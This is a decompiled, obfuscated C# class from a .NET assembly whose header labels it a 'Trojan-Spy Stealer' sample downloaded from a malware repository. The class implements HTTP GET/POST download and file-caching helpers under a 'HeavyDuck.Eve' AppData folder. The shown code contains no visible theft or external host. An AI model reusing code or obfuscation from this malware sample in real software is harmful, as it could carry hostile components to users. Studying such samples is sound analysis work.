// Decompiled with JetBrains decompiler
// Type: AvkJoyfOeh7dTxCa0j.vUVYekerQS9BdcWk3X
// Assembly: CLAIMVALUESATTRIBUT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 02CC8C23-A5FB-4ECC-B8C2-95BA2C4203FD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f4bef0754be1d8e60471746bb06004a86ab38cb0ffb281973fd45f81b610307e.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Web;

namespace AvkJoyfOeh7dTxCa0j
{
  internal static class vUVYekerQS9BdcWk3X
  {
    private static readonly string lYpOsZJrIV;
    private static readonly MD5 cuwOEHg820;
    private static readonly UTF8Encoding L23OQqeSm2;
    internal static vUVYekerQS9BdcWk3X fKmWnr3jr2tbFY7TFF4;

    [SpecialName]
    public static string e5iON7x0UC() => vUVYekerQS9BdcWk3X.lYpOsZJrIV;

    [SpecialName]
    public static MD5 IZbOkVdZMt() => vUVYekerQS9BdcWk3X.cuwOEHg820;

    [SpecialName]
    public static UTF8Encoding a2lO69Pvj9() => vUVYekerQS9BdcWk3X.L23OQqeSm2;

    public static HV3ZyQdJE0Z1pMphII OHoOGMpovk(
      string _param0,
      string _param1,
      TimeSpan _param2)
    {
      return vUVYekerQS9BdcWk3X.lvrOC0VCMn(_param0, _param1, _param2, (S68g4BO8yPnc05dptk) null);
    }

    public static HV3ZyQdJE0Z1pMphII lvrOC0VCMn(
      string _param0,
      string _param1,
      TimeSpan _param2,
      S68g4BO8yPnc05dptk _param3)
    {
      return vUVYekerQS9BdcWk3X.bQoODFgqKg(IqngWksaSHhuWcwbMg.Get, _param0, _param1, (O5yF9YwSBrf30h3eJt) new jTKAI3Jg05q1ijq0Jj(_param2), (IEnumerable<KeyValuePair<string, string>>) null, _param3);
    }

    public static HV3ZyQdJE0Z1pMphII rxIOyKhSMI(
      string _param0,
      string _param1,
      O5yF9YwSBrf30h3eJt _param2,
      S68g4BO8yPnc05dptk _param3)
    {
      return vUVYekerQS9BdcWk3X.bQoODFgqKg(IqngWksaSHhuWcwbMg.Get, _param0, _param1, _param2, (IEnumerable<KeyValuePair<string, string>>) null, _param3);
    }

    public static HV3ZyQdJE0Z1pMphII wUCOr3eHF2(
      string _param0,
      string _param1,
      TimeSpan _param2,
      IEnumerable<KeyValuePair<string, string>> _param3)
    {
      return vUVYekerQS9BdcWk3X.aYbO01XEm7(_param0, _param1, _param2, _param3, (S68g4BO8yPnc05dptk) null);
    }

    public static HV3ZyQdJE0Z1pMphII aYbO01XEm7(
      string _param0,
      string _param1,
      TimeSpan _param2,
      IEnumerable<KeyValuePair<string, string>> _param3,
      S68g4BO8yPnc05dptk _param4)
    {
      return vUVYekerQS9BdcWk3X.bQoODFgqKg(IqngWksaSHhuWcwbMg.Post, _param0, _param1, (O5yF9YwSBrf30h3eJt) new jTKAI3Jg05q1ijq0Jj(_param2), _param3, _param4);
    }

    public static HV3ZyQdJE0Z1pMphII E10OwSYxEb(
      string _param0,
      string _param1,
      O5yF9YwSBrf30h3eJt _param2,
      IEnumerable<KeyValuePair<string, string>> _param3,
      S68g4BO8yPnc05dptk _param4)
    {
      return vUVYekerQS9BdcWk3X.bQoODFgqKg(IqngWksaSHhuWcwbMg.Post, _param0, _param1, _param2, _param3, _param4);
    }

    private static HV3ZyQdJE0Z1pMphII bQoODFgqKg(
      IqngWksaSHhuWcwbMg _param0,
      string _param1,
      string _param2,
      O5yF9YwSBrf30h3eJt _param3,
      IEnumerable<KeyValuePair<string, string>> _param4,
      S68g4BO8yPnc05dptk _param5)
    {
      string str = (string) null;
      if (_param0 == IqngWksaSHhuWcwbMg.Get && _param4 != null)
        throw new ArgumentException("GET method and parameters don't mix");
      HV3ZyQdJE0Z1pMphII hv3ZyQdJe0Z1pMphIi = vUVYekerQS9BdcWk3X.ywcOVNkLfD(_param2, _param3);
      if (hv3ZyQdJe0Z1pMphIi.DDo8fj0fBb() == (qQDffEQAoF1X29uVmA) 0)
        return hv3ZyQdJe0Z1pMphIi;
      try
      {
        switch (_param0)
        {
          case IqngWksaSHhuWcwbMg.Get:
            str = vUVYekerQS9BdcWk3X.gHoOJY89tP(_param1);
            break;
          case IqngWksaSHhuWcwbMg.Post:
            str = vUVYekerQS9BdcWk3X.W20Omk1Tra(_param1, _param4);
            break;
          default:
            throw new ArgumentException("Unknown HTTP method " + _param0.ToString());
        }
        if (_param5 != null)
          _param5(str);
        System.IO.File.Copy(str, _param2, true);
        return new HV3ZyQdJE0Z1pMphII(_param2, true, (qQDffEQAoF1X29uVmA) 0, _param3.imBhWkgtpC(_param2));
      }
      catch (Exception ex)
      {
        return hv3ZyQdJe0Z1pMphIi.DDo8fj0fBb() != (qQDffEQAoF1X29uVmA) 2 ? HV3ZyQdJE0Z1pMphII.zGs8Hyq7GB(hv3ZyQdJe0Z1pMphIi, ex) : HV3ZyQdJE0Z1pMphII.aUG8cPshTa(ex);
      }
      finally
      {
        try
        {
          if (!string.IsNullOrEmpty(str))
            System.IO.File.Delete(str);
        }
        catch
        {
        }
      }
    }

    public static string gHoOJY89tP(string _param0)
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) vUVYekerQS9BdcWk3X.jhwd1i3hFVBltm2Rt7k((object) _param0);
      httpWebRequest.KeepAlive = false;
      httpWebRequest.Method = "GET";
      vUVYekerQS9BdcWk3X.Qd26i63FOnQbqvYym6K((object) httpWebRequest, (object) "HeavyDuck.Eve");
      WebResponse webResponse = (WebResponse) null;
      int num = 0;
      if (vUVYekerQS9BdcWk3X.K8nhdJ3sC6beIwlimSH() == null)
        goto label_2;
label_1:
      switch (num)
      {
        default:
          try
          {
            webResponse = httpWebRequest.GetResponse();
            using (Stream responseStream = webResponse.GetResponseStream())
              return vUVYekerQS9BdcWk3X.EIROPC0IrN(responseStream);
          }
          finally
          {
            if (webResponse != null)
              vUVYekerQS9BdcWk3X.W85iAn3djQ0HF4teOrM((object) webResponse);
          }
      }
label_2:
      num = 0;
      goto label_1;
    }

    public static string W20Omk1Tra(
      string _param0,
      IEnumerable<KeyValuePair<string, string>> _param1)
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      httpWebRequest.KeepAlive = false;
      httpWebRequest.Method = "POST";
      httpWebRequest.UserAgent = "HeavyDuck.Eve";
      httpWebRequest.ServicePoint.Expect100Continue = false;
      WebResponse webResponse = (WebResponse) null;
      try
      {
        using (Stream requestStream = httpWebRequest.GetRequestStream())
        {
          byte[] bytes = vUVYekerQS9BdcWk3X.a2lO69Pvj9().GetBytes(vUVYekerQS9BdcWk3X.gGRO4eko9U(_param1));
          requestStream.Write(bytes, 0, bytes.Length);
        }
        webResponse = httpWebRequest.GetResponse();
        using (Stream responseStream = webResponse.GetResponseStream())
          return vUVYekerQS9BdcWk3X.EIROPC0IrN(responseStream);
      }
      finally
      {
        webResponse?.Close();
      }
    }

    public static string EIROPC0IrN(Stream _param0)
    {
      string path = (string) null;
      byte[] buffer = new byte[32768];
      int offset = 0;
      try
      {
        path = Path.GetTempFileName();
        using (FileStream fileStream = System.IO.File.Open(path, FileMode.Open, FileAccess.Write))
        {
          int count;
          while (0 < (count = _param0.Read(buffer, offset, buffer.Length)))
            fileStream.Write(buffer, 0, count);
        }
      }
      catch
      {
        try
        {
          if (!string.IsNullOrEmpty(path))
            System.IO.File.Delete(path);
        }
        catch
        {
        }
        throw;
      }
      return path;
    }

    public static HV3ZyQdJE0Z1pMphII uy3OjsK8GW(string _param0, TimeSpan _param1) => vUVYekerQS9BdcWk3X.ywcOVNkLfD(_param0, (O5yF9YwSBrf30h3eJt) new jTKAI3Jg05q1ijq0Jj(_param1));

    public static HV3ZyQdJE0Z1pMphII ywcOVNkLfD(
      string _param0,
      O5yF9YwSBrf30h3eJt _param1)
    {
      try
      {
        if (new FileInfo(_param0).Exists)
        {
          DateTime dateTime = _param1.imBhWkgtpC(_param0);
          int num = 0;
          if (vUVYekerQS9BdcWk3X.DQdwHW3cWPdxNGrrVxA())
            goto label_6;
label_2:
          switch (num)
          {
            case 1:
              goto label_7;
            default:
              return DateTime.Now < dateTime ? new HV3ZyQdJE0Z1pMphII(_param0, false, (qQDffEQAoF1X29uVmA) 0, dateTime) : new HV3ZyQdJE0Z1pMphII(_param0, false, (qQDffEQAoF1X29uVmA) 1, dateTime);
          }
label_6:
          num = 0;
          goto label_2;
        }
label_7:
        return HV3ZyQdJE0Z1pMphII.wKC8xhTmnD(_param0);
      }
      catch (Exception ex)
      {
        return HV3ZyQdJE0Z1pMphII.Vd48Wn8SXR(_param0, ex);
      }
    }

    public static string gGRO4eko9U(IEnumerable<KeyValuePair<string, string>> _param0)
    {
      if (_param0 == null)
        return "";
      List<KeyValuePair<string, string>> keyValuePairList = new List<KeyValuePair<string, string>>(_param0);
      keyValuePairList.Sort((Comparison<KeyValuePair<string, string>>) ((a, b) => a.Key == b.Key ? string.Compare(a.Value, b.Value) : string.Compare(a.Key, b.Key)));
      StringBuilder stringBuilder = new StringBuilder();
      foreach (KeyValuePair<string, string> keyValuePair in keyValuePairList)
      {
        stringBuilder.Append(HttpUtility.UrlEncode(keyValuePair.Key));
        stringBuilder.Append("=");
        stringBuilder.Append(HttpUtility.UrlEncode(keyValuePair.Value));
        stringBuilder.Append("&");
      }
      if (stringBuilder.Length > 0)
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
      return stringBuilder.ToString();
    }

    public static string kETO5kVOIL(IEnumerable<KeyValuePair<string, string>> _param0) => vUVYekerQS9BdcWk3X.tqLOaXplcP(_param0, (Encoding) vUVYekerQS9BdcWk3X.a2lO69Pvj9());

    public static string tqLOaXplcP(
      IEnumerable<KeyValuePair<string, string>> _param0,
      Encoding _param1)
    {
      return BitConverter.ToString(vUVYekerQS9BdcWk3X.IZbOkVdZMt().ComputeHash(_param1.GetBytes(vUVYekerQS9BdcWk3X.gGRO4eko9U(_param0)))).Replace("-", "");
    }

    static vUVYekerQS9BdcWk3X()
    {
      YKUvaI4TsnyoXODJ2q.GJnKaSGoKIybi();
      vUVYekerQS9BdcWk3X.lYpOsZJrIV = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "HeavyDuck.Eve");
      vUVYekerQS9BdcWk3X.cuwOEHg820 = MD5.Create();
      vUVYekerQS9BdcWk3X.L23OQqeSm2 = new UTF8Encoding(false);
    }

    internal static bool DQdwHW3cWPdxNGrrVxA() => vUVYekerQS9BdcWk3X.fKmWnr3jr2tbFY7TFF4 == null;

    internal static vUVYekerQS9BdcWk3X K8nhdJ3sC6beIwlimSH() => vUVYekerQS9BdcWk3X.fKmWnr3jr2tbFY7TFF4;

    internal static object jhwd1i3hFVBltm2Rt7k([In] object obj0) => (object) WebRequest.Create((string) obj0);

    internal static void Qd26i63FOnQbqvYym6K([In] object obj0, [In] object obj1) => ((HttpWebRequest) obj0).UserAgent = (string) obj1;

    internal static void W85iAn3djQ0HF4teOrM([In] object obj0) => ((WebResponse) obj0).Close();
  }
}
